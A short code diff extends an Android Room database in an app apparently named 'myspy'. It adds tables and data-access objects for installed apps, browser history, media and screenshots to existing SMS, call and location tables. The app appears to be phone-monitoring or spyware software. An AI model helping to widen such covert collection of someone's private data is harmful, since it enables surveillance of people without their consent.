@@ -16,9 +16,13 @@ import com.myspy.android.data.local.db.entities.*
     entities = [
         SmsEntity::class,
         CallEntity::class,
-        LocationEntity::class
+        LocationEntity::class,
+        AppEntity::class,
+        BrowserHistoryEntity::class,
+        MediaEntity::class,
+        ScreenshotEntity::class
     ],
-    version = 1,
+    version = 2,
     exportSchema = false
 )
 abstract class AppDatabase : RoomDatabase() {
@@ -26,6 +30,10 @@ abstract class AppDatabase : RoomDatabase() {
     abstract fun smsDao(): SmsDao
     abstract fun callsDao(): CallsDao
     abstract fun locationDao(): LocationDao
+    abstract fun appsDao(): AppsDao
+    abstract fun browserHistoryDao(): BrowserHistoryDao
+    abstract fun mediaDao(): MediaDao
+    abstract fun screenshotDao(): ScreenshotDao
 
     companion object {
         @Volatile
